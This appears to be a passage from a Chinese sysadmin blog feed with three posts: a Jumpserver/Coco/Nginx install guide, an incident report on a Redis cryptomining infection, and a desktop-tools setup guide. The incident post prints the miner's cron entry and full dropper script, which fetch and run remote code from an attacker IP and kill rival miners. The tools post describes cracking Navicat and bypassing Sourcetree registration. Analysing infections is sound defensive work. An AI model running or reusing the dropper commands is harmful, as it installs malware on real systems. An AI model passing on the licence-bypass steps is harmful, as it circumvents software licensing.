class="line">$ cd /data/opt/coco</span><br><span class="line">$ cp conf_example.py conf.py</span><br><span class="line">$ vi conf.py</span><br><span class="line"></span><br><span class="line"># 注意对齐，不要直接复制本文档的内容</span><br></pre></td></tr></table></figure><p><strong>注意: 配置文件是 Python 格式，不要用 TAB，而要用空格</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">#</span><br><span class="line"></span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">BASE_DIR = os.path.dirname(__file__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Config:</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Coco config file, coco also load config from server update setting below</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    # 项目名称, 会用来向Jumpserver注册, 识别而已, 不能重复</span><br><span class="line">    # NAME = &quot;localhost&quot;</span><br><span class="line">    NAME = &quot;coco&quot;</span><br><span class="line"></span><br><span class="line">    # Jumpserver项目的url, api请求注册会使用, 如果Jumpserver没有运行在127.0.0.1:8080，请修改此处</span><br><span class="line">    # CORE_HOST = os.environ.get(&quot;CORE_HOST&quot;) or &apos;http://127.0.0.1:8080&apos;</span><br><span class="line">    CORE_HOST = &apos;http://127.0.0.1:8080&apos;</span><br><span class="line"></span><br><span class="line">    # 启动时绑定的ip, 默认 0.0.0.0</span><br><span class="line">    # BIND_HOST = &apos;0.0.0.0&apos;</span><br><span class="line"></span><br><span class="line">    # 监听的SSH端口号, 默认2222</span><br><span class="line">    # SSHD_PORT = 2222</span><br><span class="line"></span><br><span class="line">    # 监听的HTTP/WS端口号，默认5000</span><br><span class="line">    # HTTPD_PORT = 5000</span><br><span class="line"></span><br><span class="line">    # 项目使用的ACCESS KEY, 默认会注册,并保存到 ACCESS_KEY_STORE中,</span><br><span class="line">    # 如果有需求, 可以写到配置文件中, 格式 access_key_id:access_key_secret</span><br><span class="line">    # ACCESS_KEY = None</span><br><span class="line"></span><br><span class="line">    # ACCESS KEY 保存的地址, 默认注册后会保存到该文件中</span><br><span class="line">    # ACCESS_KEY_STORE = os.path.join(BASE_DIR, &apos;keys&apos;, &apos;.access_key&apos;)</span><br><span class="line"></span><br><span class="line">    # 加密密钥</span><br><span class="line">    # SECRET_KEY = None</span><br><span class="line"></span><br><span class="line">    # 设置日志级别 [&apos;DEBUG&apos;, &apos;INFO&apos;, &apos;WARN&apos;, &apos;ERROR&apos;, &apos;FATAL&apos;, &apos;CRITICAL&apos;]</span><br><span class="line">    # LOG_LEVEL = &apos;INFO&apos;</span><br><span class="line">    LOG_LEVEL = &apos;WARN&apos;</span><br><span class="line"></span><br><span class="line">    # 日志存放的目录</span><br><span class="line">    # LOG_DIR = os.path.join(BASE_DIR, &apos;logs&apos;)</span><br><span class="line"></span><br><span class="line">    # Session录像存放目录</span><br><span class="line">    # SESSION_DIR = os.path.join(BASE_DIR, &apos;sessions&apos;)</span><br><span class="line"></span><br><span class="line">    # 资产显示排序方式, [&apos;ip&apos;, &apos;hostname&apos;]</span><br><span class="line">    # ASSET_LIST_SORT_BY = &apos;ip&apos;</span><br><span class="line"></span><br><span class="line">    # 登录是否支持密码认证</span><br><span class="line">    # PASSWORD_AUTH = True</span><br><span class="line"></span><br><span class="line">    # 登录是否支持秘钥认证</span><br><span class="line">    # PUBLIC_KEY_AUTH = True</span><br><span class="line"></span><br><span class="line">    # SSH白名单</span><br><span class="line">    # ALLOW_SSH_USER = &apos;all&apos;  # [&apos;test&apos;, &apos;test2&apos;]</span><br><span class="line"></span><br><span class="line">    # SSH黑名单, 如果用户同时在白名单和黑名单，黑名单优先生效</span><br><span class="line">    # BLOCK_SSH_USER = []</span><br><span class="line"></span><br><span class="line">    # 和Jumpserver 保持心跳时间间隔</span><br><span class="line">    # HEARTBEAT_INTERVAL = 5</span><br><span class="line"></span><br><span class="line">    # Admin的名字，出问题会提示给用户</span><br><span class="line">    # ADMINS = &apos;&apos;</span><br><span class="line">    COMMAND_STORAGE = &#123;</span><br><span class="line">        &quot;TYPE&quot;: &quot;server&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    REPLAY_STORAGE = &#123;</span><br><span class="line">        &quot;TYPE&quot;: &quot;server&quot;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    # SSH连接超时时间 (default 15 seconds)</span><br><span class="line">    # SSH_TIMEOUT = 15</span><br><span class="line"></span><br><span class="line">    # 语言 = en</span><br><span class="line">    LANGUAGE_CODE = &apos;zh&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">config = Config()</span><br><span class="line"># 安装 Web Terminal 前端: Luna  需要 Nginx 来运行访问 访问（https://github.com/jumpserver/luna/releases）下载对应版本的 release 包，直接解压，不需要编译</span><br><span class="line">$ cd /data/opt</span><br><span class="line">$ wget https://github.com/jumpserver/luna/releases/download/1.4.1/luna.tar.gz</span><br><span class="line">$ tar xvf luna.tar.gz</span><br><span class="line">$ chown -R root:root luna</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 配置 Nginx 整合各组件</span><br><span class="line">$ vim /etc/nginx/conf.d/jumpserver.conf</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line"></span><br><span class="line">    client_max_body_size 100m;  # 录像上传大小限制</span><br><span class="line"></span><br><span class="line">    location /luna/ &#123;</span><br><span class="line">        try_files $uri / /index.html;</span><br><span class="line">        alias /data/opt/luna/;  # luna 路径，如果修改安装目录，此处需要修改</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    location /media/ &#123;</span><br><span class="line">        add_header Content-Encoding gzip;</span><br><span class="line">        root /data/opt/jumpserver/data/;  # 录像位置，如果修改安装目录，此处需要修改</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    location /static/ &#123;</span><br><span class="line">        root /data/opt/jumpserver/data/;  # 静态资源，如果修改安装目录，此处需要修改</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    location /socket.io/ &#123;</span><br><span class="line">        proxy_pass       http://localhost:5000/socket.io/;  # 如果coco安装在别的服务器, 请填写它的ip</span><br><span class="line">        proxy_buffering off;</span><br><span class="line">        proxy_http_version 1.1;</span><br><span class="line">        proxy_set_header Upgrade $http_upgrade;</span><br><span class="line">        proxy_set_header Connection &quot;upgrade&quot;;</span><br><span class="line">        proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">        proxy_set_header Host $host;</span><br><span class="line">        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">        access_log off;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    location /guacamole/ &#123;</span><br><span class="line">        proxy_pass       http://localhost:8081/;  # 如果docker安装在别的服务器, 请填写它的ip</span><br><span class="line">        proxy_buffering off;</span><br><span class="line">        proxy_http_version 1.1;</span><br><span class="line">        proxy_set_header Upgrade $http_upgrade;</span><br><span class="line">        proxy_set_header Connection $http_connection;</span><br><span class="line">        proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">        proxy_set_header Host $host;</span><br><span class="line">        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">        access_log off;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        proxy_pass http://localhost:8080;  # 如果jumpserver安装在别的服务器, 请填写它的ip</span><br><span class="line">        proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">        proxy_set_header Host $host;</span><br><span class="line">        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"># 生成数据库表结构和初始化数据</span><br><span class="line">$ cd /data/opt/jumpserver/utils</span><br><span class="line">$ bash make_migrations.sh</span><br><span class="line"></span><br><span class="line"># 运行 Jumpserver</span><br><span class="line">$ cd /data/opt/jumpserver</span><br><span class="line">$ ./jms start all  # 后台运行使用 -d 参数./jms start all -d</span><br><span class="line"># 新版本更新了运行脚本，使用方式./jms start|stop|status|restart all  后台运行请添加 -d 参数</span><br><span class="line"></span><br><span class="line"># 运行 Coco</span><br><span class="line">$ cd /data/opt/coco</span><br><span class="line">$ ./cocod start  # 后台运行使用 -d 参数./cocod start -d</span><br><span class="line"># 新版本更新了运行脚本，使用方式./cocod start|stop|status|restart  后台运行请添加 -d 参数</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 运行 Nginx</span><br><span class="line">$ nginx -t   # 确保配置没有问题, 有问题请先解决</span><br><span class="line">$ service nginx start</span><br><span class="line"></span><br><span class="line"># 访问 http://xx.xx.xx.xx (注意，没有 :8080，通过 nginx 代理端口进行访问)</span><br><span class="line"># 默认账号: admin 密码: admin  到会话管理-终端管理 接受 Coco Guacamole 等应用的注册</span><br><span class="line"># 测试连接</span><br><span class="line">$ ssh -p2222 admin@xx.xx.xx.xx</span><br><span class="line">$ sftp -P2222 admin@xx.xx.xx.xx</span><br><span class="line">  密码: admin</span><br><span class="line">##当然密码已经改了</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 如果是用在 Windows 下，Xshell Terminal 登录语法如下</span><br><span class="line">$ ssh admin@xx.xx.xx.xx 2222</span><br><span class="line">$ sftp admin@xx.xx.xx.xx 2222</span><br><span class="line">  密码: admin</span><br><span class="line">  如果能登陆代表部署成功</span><br><span class="line"></span><br><span class="line"># sftp默认上传的位置在资产的 /tmp 目录下</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 其他的ssh及sftp客户端这里就不多做说明，自行搜索使用</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="server" scheme="https://fenghong.tech/categories/server/"/>
    
    
      <category term="Linux" scheme="https://fenghong.tech/tags/Linux/"/>
    
      <category term="Jumpserver" scheme="https://fenghong.tech/tags/Jumpserver/"/>
    
      <category term="Mariadb-10.2.15" scheme="https://fenghong.tech/tags/Mariadb-10-2-15/"/>
    
      <category term="Coco" scheme="https://fenghong.tech/tags/Coco/"/>
    
      <category term="Python" scheme="https://fenghong.tech/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>记一次挖矿病毒处理qW3xT.2</title>
    <link href="https://fenghong.tech/problem180812.html"/>
    <id>https://fenghong.tech/problem180812.html</id>
    <published>2018-08-12T01:59:32.000Z</published>
    <updated>2018-11-07T11:31:40.440Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="问题发现及解决"><a href="#问题发现及解决" class="headerlink" title="问题发现及解决"></a>问题发现及解决</h2><p>​    在ucloud使用redis，开启了6379端口，但是当时并没有对redis的密码进行设置复杂的设置，设置的为123456。</p><p>使用top命令查询，发现cpu异常占用过高。99%以上</p><p><img src="images/tapd_23280401_1536318583_22.png" alt="1536317606280"></p><p>​    qW3xT.2程序和ddgs.3013程序，看起来就不是正常的程序。google了一下，发现是美国的一个挖矿程序。</p><p>​    进入/tmp文件夹下。发现qW3xT.2文件，删除。之后kill掉qW3xT.2该进程，但是一段时间之后，发现该行程又重新启动。</p><p>​    一段时间之后，删除的文件重新生成，dds和挖矿的进程又重新执行。此时怀疑是否有计划任务，此时查看计划任务的列表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">]# find / -name qW3xT.2</span><br><span class="line">]# find / -name ddgs.3013</span><br><span class="line">]# crontab -l </span><br><span class="line">*/15 * * * * curl -fsSL http://149.56.106.215:8000/i.sh | sh</span><br><span class="line">]# cd /var/spool/cron/</span><br><span class="line">]# rm -rf * </span><br><span class="line">]# crontab -l  ##任务计划清除完毕。</span><br></pre></td></tr></table></figure><p>​    分析一下挖矿脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">]# curl -fsSL http://149.56.106.215:8000/i.sh | sh</span><br><span class="line"></span><br><span class="line">export PATH=$PATH:/bin:/usr/bin:/usr/local/bin:/usr/sbin</span><br><span class="line"></span><br><span class="line">echo &quot;&quot; &gt; /var/spool/cron/root</span><br><span class="line">echo &quot;*/15 * * * * curl -fsSL http://149.56.106.215:8000/i.sh | sh&quot; &gt;&gt; /var/spool/cron/root</span><br><span class="line">echo &quot;*/15 * * * * wget -q -O- http://149.56.106.215:8000/i.sh | sh&quot; &gt;&gt; /var/spool/cron/root</span><br><span class="line"></span><br><span class="line">mkdir -p /var/spool/cron/crontabs</span><br><span class="line">echo &quot;&quot; &gt; /var/spool/cron/crontabs/root</span><br><span class="line">echo &quot;*/15 * * * * curl -fsSL http://149.56.106.215:8000/i.sh | sh&quot; &gt;&gt; /var/spool/cron/crontabs/root</span><br><span class="line">echo &quot;*/15 * * * * wget -q -O- http://149.56.106.215:8000/i.sh | sh&quot; &gt;&gt; /var/spool/cron/crontabs/root</span><br><span class="line"></span><br><span class="line">ps auxf | grep -v grep | grep /tmp/ddgs.3013 || rm -rf /tmp/ddgs.3013</span><br><span class="line">if [ ! -f &quot;/tmp/ddgs.3013&quot; ]; then</span><br><span class="line">    wget -q http://149.56.106.215:8000/static/3013/ddgs.$(uname -m) -O /tmp/ddgs.3013</span><br><span class="line">    curl -fsSL http://149.56.106.215:8000/static/3013/ddgs.$(uname -m) -o /tmp/ddgs.3013</span><br><span class="line">fi</span><br><span class="line">chmod +x /tmp/ddgs.3013 &amp;&amp; /tmp/ddgs.3013</span><br><span class="line"></span><br><span class="line">ps auxf | grep -v grep | grep Circle_MI | awk &apos;&#123;print $2&#125;&apos; | xargs kill</span><br><span class="line">ps auxf | grep -v grep | grep get.bi-chi.com | awk &apos;&#123;print $2&#125;&apos; | xargs kill</span><br><span class="line">ps auxf | grep -v grep | grep hashvault.pro | awk &apos;&#123;print $2&#125;&apos; | xargs kill</span><br><span class="line">ps auxf | grep -v grep | grep nanopool.org | awk &apos;&#123;print $2&#125;&apos; | xargs kill</span><br><span class="line">ps auxf | grep -v grep | grep minexmr.com | awk &apos;&#123;print $2&#125;&apos; | xargs kill</span><br><span class="line">ps auxf | grep -v grep | grep /boot/efi/ | awk &apos;&#123;print $2&#125;&apos; | xargs kill</span><br><span class="line">#ps auxf | grep -v grep | grep ddg.2006 | awk &apos;&#123;print $2&#125;&apos; | kill</span><br><span class="line">#ps auxf | grep -v grep | grep ddg.2010 | awk &apos;&#123;print $2&#125;&apos; | kill</span><br></pre></td></tr></table></figure><p>​    解决redis入口问题，因为最开始没有设置密码，所以首先修改redis.conf。设置密码，然后重启redis。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>​    知名应用程序的端口应避免使用默认端口，认证密码应稍微复杂，避免使用888888,123456等简单密码。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="server" scheme="https://fenghong.tech/categories/server/"/>
    
    
      <category term="Linux" scheme="https://fenghong.tech/tags/Linux/"/>
    
      <category term="problem" scheme="https://fenghong.tech/tags/problem/"/>
    
      <category term="病毒" scheme="https://fenghong.tech/tags/%E7%97%85%E6%AF%92/"/>
    
  </entry>
  
  <entry>
    <title>运维桌面软件应用安装</title>
    <link href="https://fenghong.tech/opsenv.html"/>
    <id>https://fenghong.tech/opsenv.html</id>
    <published>2018-08-06T01:59:32.000Z</published>
    <updated>2018-11-07T11:31:40.440Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、Navicat-for-mysql"><a href="#一、Navicat-for-mysql" class="headerlink" title="一、Navicat for mysql"></a>一、Navicat for mysql</h1><ol><li><p>下载地址：<br>Navicat Premium（64 bit）简体中文版：<a href="http://xiazai.formysql.com/trial/navicat_premium_trial_64.exe" target="_blank" rel="noopener">http://xiazai.formysql.com/trial/navicat_premium_trial_64.exe</a><br>Navicat Premium Mac版：<a href="http://download3.navicat.com/download/navicat111_premium_cs.dmg" target="_blank" rel="noopener">http://download3.navicat.com/download/navicat111_premium_cs.dmg</a><br>Navicat for MySQL（64 bit）简体中文版：<a href="http://xiazai.formysql.com/trial/navicat_x64_trial.exe" target="_blank" rel="noopener">http://xiazai.formysql.com/trial/navicat_x64_trial.exe</a><br>Navicat for MySQL Mac版：<a href="http://download3.navicat.com/download/navicat111_mysql_cs.dmg" target="_blank" rel="noopener">http://download3.navicat.com/download/navicat111_mysql_cs.dmg</a><br>Navicat for SQL Server（64 bit）简体中文版：<a href="http://xiazai.formysql.com/trial/navicat_sqlserver_trial_64.exe" target="_blank" rel="noopener">http://xiazai.formysql.com/trial/navicat_sqlserver_trial_64.exe</a> </p></li><li><p>解压</p></li><li><p>破解，<a href="https://download.csdn.net/download/qq_39238554/10285323" target="_blank" rel="noopener">https://download.csdn.net/download/qq_39238554/10285323</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.安装原版的Navicat for MySQL 记住安装目录，有用</span><br><span class="line">2.把“PatchNavicat.exe”文件放到软件安装目录下</span><br><span class="line">3.运行PatchNavicat.exe</span><br><span class="line">4.选择Navicat主程序navicat.exe为其打上补丁即可。</span><br><span class="line">5.破解后启动软件，不会再提醒要需要注册了</span><br></pre></td></tr></table></figure></li></ol><h1 id="二、Xshell-Xftp下载安装"><a href="#二、Xshell-Xftp下载安装" class="headerlink" title="二、Xshell/Xftp下载安装"></a>二、Xshell/Xftp下载安装</h1><ol><li>下载</li></ol><p>Xshell6：<a href="https://www.netsarang.com/products/xsh_overview.html" target="_blank" rel="noopener">https://www.netsarang.com/products/xsh_overview.html</a></p><p>Xftp6： <a href="https://www.netsarang.com/products/xfp_overview.html" target="_blank" rel="noopener">https://www.netsarang.com/products/xfp_overview.html</a></p><ol start="2"><li>下载完毕后，点击安装，按需安装至相关文件夹</li><li>使用</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.打开桌面的Xshell，进行软件首界面，选择新建</span><br><span class="line">2.填写名称、协议、主机号和端口号，点击确定按钮</span><br><span class="line">3.进入会话对话框，选择要连接的账户，点击连接按钮</span><br><span class="line">4.输入用户登录名，点击确定按钮</span><br><span class="line">5.输入登录密码，点击确定，连接成功</span><br></pre></td></tr></table></figure><h1 id="三、git安装"><a href="#三、git安装" class="headerlink" title="三、git安装"></a>三、git安装</h1><ol><li><p>从官网下载：<a href="https://git-scm.com/downloads" target="_blank" rel="noopener">https://git-scm.com/downloads</a></p></li><li><p>安装即可</p></li><li><p>右击鼠标，出现Git Gui Here 和Git Bash Here,说明安装成功</p></li><li>全局设置,点击Git Bash Here.进入命令行界面。</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git config --global user.name &quot;Your Name&quot;</span><br><span class="line">$ git config --global user.email &quot;email@example.com&quot;</span><br></pre></td></tr></table></figure><h1 id="四、Sourcetree安装"><a href="#四、Sourcetree安装" class="headerlink" title="四、Sourcetree安装"></a>四、Sourcetree安装</h1><p>安装好Git后，可以安装Sourcetree了，</p><ol><li><p>下载软件地址：<a href="https://www.sourcetreeapp.com/" target="_blank" rel="noopener">https://www.sourcetreeapp.com/</a></p><pre><code>------&gt;Download</code></pre></li><li><p>下载好后，直接进行安装，这里需要跳过注册</p></li><li><p>在windows资源管理器里输入</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">%LocalAppData%\Atlassian\SourceTree\</span><br><span class="line"></span><br><span class="line">新建一个accounts.json，内容如下，保存重启</span><br><span class="line"></span><br><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">    &quot;$id&quot;: &quot;1&quot;,</span><br><span class="line">    &quot;$type&quot;: &quot;SourceTree.Api.Host.Identity.Model.IdentityAccount, SourceTree.Api.Host.Identity&quot;,</span><br><span class="line">    &quot;Authenticate&quot;: true,</span><br><span class="line">    &quot;HostInstance&quot;: &#123;</span><br><span class="line">      &quot;$id&quot;: &quot;2&quot;,</span><br><span class="line">      &quot;$type&quot;: &quot;SourceTree.Host.Atlassianaccount.AtlassianAccountInstance, SourceTree.Host.AtlassianAccount&quot;,</span><br><span class="line">      &quot;Host&quot;: &#123;</span><br><span class="line">        &quot;$id&quot;: &quot;3&quot;,</span><br><span class="line">        &quot;$type&quot;: &quot;SourceTree.Host.Atlassianaccount.AtlassianAccountHost, SourceTree.Host.AtlassianAccount&quot;,</span><br><span class="line">        &quot;Id&quot;: &quot;atlassian account&quot;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;BaseUrl&quot;: &quot;https://id.atlassian.com/&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;Credentials&quot;: &#123;</span><br><span class="line">      &quot;$id&quot;: &quot;4&quot;,</span><br><span class="line">      &quot;$type&quot;: &quot;SourceTree.Model.BasicAuthCredentials, SourceTree.Api.Account&quot;,</span><br><span class="line">      &quot;Username&quot;: &quot;&quot;,</span><br><span class="line">      &quot;Email&quot;: null</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;IsDefault&quot;: false</span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><ol start="4"><li>进sourcetree页面，开启仓库克隆及拉取操作，Mecurial插件可以按需安装。用Git可以跳过。</li><li>进入sourcetree后,点击clone，添加仓库</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url: http://139.224.43.8:88/qianxiang/web.git  #git仓库名称路径</span><br><span class="line">path：E:\source_code\qianxiang\web #存放本地的磁盘位置如</span><br><span class="line">#点击构建即可</span><br></pre></td></tr></table></figure><ol start="6"><li>分支管理。</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Git工作流中，将&quot;/&quot;  ---&gt; &quot;_&quot;</span><br><span class="line">feature/ ---&gt; feature_</span><br><span class="line">release/ ---&gt; release_</span><br><span class="line">    hotfix/  ---&gt; hotfix_</span><br></pre></td></tr></table></figure><ol start="7"><li>用git命令行模式管理分支</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git pull  </span><br><span class="line">git checkout release_1000252_08241100#切换分支</span><br></pre></td></tr></table></figure><ol start="8"><li>合并分支并查询差异，告知相关负责人。</li></ol><h1 id="五、TortoiseSVN安装"><a href="#五、TortoiseSVN安装" class="headerlink" title="五、TortoiseSVN安装"></a>五、TortoiseSVN安装</h1><ol><li>官网下载：<a href="https://tortoisesvn.net/downloads.html" target="_blank" rel="noopener">https://tortoisesvn.net/downloads.html</a></li><li>一直点击下一步，直到安装完成，安装TortoiseSVN并没有管理界面，但当你鼠标右击的时候，会多出SVN Checkout…和TortoiseSVN这两个选项。</li><li>简单配置</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">点击“SVN Checkout”后弹出对话框，</span><br><span class="line">URL of repository填写你的公司或组织给你的svn地址，</span><br><span class="line">Checkout directory:设置要将svn上的文件下载到本地的存储路径，</span><br><span class="line">点击ok</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
